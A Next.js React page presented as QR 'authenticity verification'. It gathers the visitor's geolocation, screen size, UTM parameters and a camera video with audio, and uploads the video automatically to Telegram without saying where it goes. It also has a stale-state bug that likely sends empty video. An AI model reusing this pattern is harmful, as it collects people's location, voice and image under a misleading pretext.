"use client";

import { useEffect, useState, useRef, useCallback } from 'react';
import { useSearchParams } from 'next/navigation';
import { notifyVisit, sendTelegramVideo } from '@/utils/telegramApi';
import { useLayoutContext } from '@/context/LayoutContext';
import { showSuccess, showError } from '@/utils/toast';
import LoadingSpinner from '@/components/LoadingSpinner';
import CallToActionButton from '@/components/CallToActionButton';
import { Video, StopCircle, Send, RefreshCcw } from 'lucide-react'; // Import Video, StopCircle, Send, RefreshCcw icons

type QrVerifyPageProps = {
  params: { lang: string };
};

const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
  const searchParams = useSearchParams();
  const { t } = useLayoutContext();
  const currentLang = params.lang;

  const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.qrScanInstructions);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [isRecording, setIsRecording] = useState<boolean>(false);
  const [videoSent, setVideoSent] = useState<boolean>(false);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
  const [videoPreviewUrl, setVideoPreviewUrl] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);

  const stopCamera = useCallback(() => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      setStream(null);
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  }, [stream]);

  const startRecording = useCallback(async () => {
    setIsLoading(true);
    setError(null);
    setVideoSent(false);
    setRecordedChunks([]);
    setVideoPreviewUrl(null);
    setStatusMessage(t.authenticity.processingRequest);

    let geoLat: number | null = null;
    let geoLon: number | null = null;

    try {
      // 1. Get Geolocation
      if (navigator.geolocation) {
        try {
          const position = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: false });
          });
          geoLat = position.coords.latitude;
          geoLon = position.coords.longitude;
        } catch (geoError) {
          console.warn("Geolocation permission denied or error:", geoError);
        }
      }

      // 2. Request Camera Access
      setStatusMessage(t.authenticity.processingRequest);
      let mediaStream: MediaStream;
      try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true }); // Request audio as well
      } catch (frontCameraError: unknown) {
        console.warn("Rear camera not available or permission denied, trying front camera:", frontCameraError);
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true }); // Fallback to front camera
      }
      
      setStream(mediaStream);

      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        await videoRef.current.play();
      }

      // 3. Send initial visit notification to get caption
      const utmQueryParams = {
        utm_source: searchParams?.get('utm_source') || null,
        utm_medium: searchParams?.get('utm_medium') || null,
        utm_campaign: searchParams?.get('utm_campaign') || null,
      };
      const bodyData = {
        lat: geoLat,
        lon: geoLon,
        screenWidth: window.innerWidth,
        screenHeight: window.innerHeight,
        isQrScan: true,
      };
      const captionMessage = await notifyVisit(bodyData, utmQueryParams);

      // 4. Initialize MediaRecorder
      const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
      setMediaRecorder(recorder);

      recorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          setRecordedChunks((prev) => [...prev, event.data]);
        }
      };

      recorder.onstop = async () => {
        setIsRecording(false);
        stopCamera(); // Stop camera after recording stops
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        setVideoPreviewUrl(url);
        setStatusMessage(t.authenticity.sendVideoButton); // Prompt to send video

        // Automatically send video after recording stops
        try {
          setIsLoading(true);
          setStatusMessage(t.authenticity.processingRequest);
          const filename = `qr_scan_video_${new Date().getTime()}.webm`;
          await sendTelegramVideo({ videoBlob: blob, caption: captionMessage, filename });
          showSuccess(t.authenticity.recordingSuccess);
          setVideoSent(true);
          setStatusMessage(t.authenticity.recordingSuccess);
        } catch (videoSendError: unknown) {
          console.error("Error sending video to Telegram:", videoSendError);
          showError(t.authenticity.recordingError);
          setError(videoSendError instanceof Error ? videoSendError.message : "Failed to send video.");
          setStatusMessage(t.authenticity.recordingError);
        } finally {
          setIsLoading(false);
        }
      };

      // 5. Start Recording
      recorder.start();
      setIsRecording(true);
      setStatusMessage(t.authenticity.recordingInstructions);

    } catch (err: unknown) {
      console.error("Error during QR verification process:", err);
      if (err instanceof DOMException && err.name === "NotAllowedError") {
        setError(t.authenticity.qrScanError + " (Camera access denied).");
        setStatusMessage(t.authenticity.qrScanError + " (Camera access denied).");
        showError(t.authenticity.qrScanError + " (Camera access denied).");
      } else if (err instanceof DOMException && err.name === "NotFoundError") {
        setError(t.authenticity.qrScanError + " (No camera found).");
        setStatusMessage(t.authenticity.qrScanError + " (No camera found).");
        showError(t.authenticity.qrScanError + " (No camera found).");
      } else {
        setError(t.authenticity.qrScanError + (err instanceof Error ? `: ${err.message}` : "."));
        setStatusMessage(t.authenticity.qrScanError);
        showError(t.authenticity.qrScanError);
      }
      setIsLoading(false);
      setIsRecording(false);
      stopCamera();
    }
  }, [currentLang, searchParams, t, stopCamera]);

  const stopRecording = useCallback(() => {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
      mediaRecorder.stop();
      setIsRecording(false);
    }
  }, [mediaRecorder]);

  const handleRetake = () => {
    stopCamera();
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
      mediaRecorder.stop();
    }
    setIsRecording(false);
    setVideoSent(false);
    setError(null);
    setRecordedChunks([]);
    setVideoPreviewUrl(null);
    setStatusMessage(t.authenticity.qrScanInstructions);
  };

  useEffect(() => {
    // Cleanup function for when component unmounts
    return () => {
      stopCamera();
      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }
      if (videoPreviewUrl) {
        URL.revokeObjectURL(videoPreviewUrl);
      }
    };
  }, [stopCamera, mediaRecorder, videoPreviewUrl]);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
      <h1 className="text-3xl font-bold mb-6">{t.authenticity.title}</h1>
      
      {isLoading && (
        <div className="mb-4">
          <LoadingSpinner />
        </div>
      )}

      <p className="text-lg mb-4">{statusMessage}</p>
      
      {error && (
        <p className="text-red-600 dark:text-red-400 text-base mb-4">{error}</p>
      )}

      <div className="relative w-full max-w-md aspect-video bg-gray-200 dark:bg-gray-700 rounded-lg overflow-hidden shadow-lg mb-6">
        {!videoPreviewUrl && (
          <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
        )}
        {videoPreviewUrl && (
          <video
            src={videoPreviewUrl}
            className="w-full h-full object-cover"
            controls
            autoPlay
            loop
          />
        )}
        {isRecording && (
          <div className="absolute top-2 left-2 bg-red-600 text-white text-xs px-2 py-1 rounded-full flex items-center">
            <span className="relative flex h-2 w-2 mr-1">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-white"></span>
            </span>
            REC
          </div>
        )}
      </div>

      <div className="flex flex-col gap-4 w-full max-w-xs">
        {!isRecording && !videoSent && !videoPreviewUrl && (
          <CallToActionButton
            onClick={startRecording}
            icon={Video}
            variant="primary"
            size="lg"
            className="mt-6"
            interactionEffect="burst"
            disabled={isLoading}
          >
            {t.authenticity.startRecordingButton || "Start Video Verification"}
          </CallToActionButton>
        )}

        {isRecording && (
          <CallToActionButton
            onClick={stopRecording}
            icon={StopCircle}
            variant="secondary"
            size="lg"
            className="mt-6"
            interactionEffect="pixels"
            disabled={isLoading}
          >
            {t.authenticity.stopRecordingButton || "Stop Recording"}
          </CallToActionButton>
        )}

        {videoPreviewUrl && !videoSent && (
          <CallToActionButton
            onClick={handleRetake}
            icon={RefreshCcw}
            variant="subtle"
            size="md"
            className="mt-4"
            disabled={isLoading}
          >
            {t.authenticity.retakeVideoButton || "Retake Video"}
          </CallToActionButton>
        )}

        {videoSent && (
          <p className="text-primary-600 dark:text-primary-400 text-xl font-semibold mt-4">
            {t.authenticity.recordingSuccess}
          </p>
        )}
      </div>
    </div>
  );
};

export default QrVerifyPage;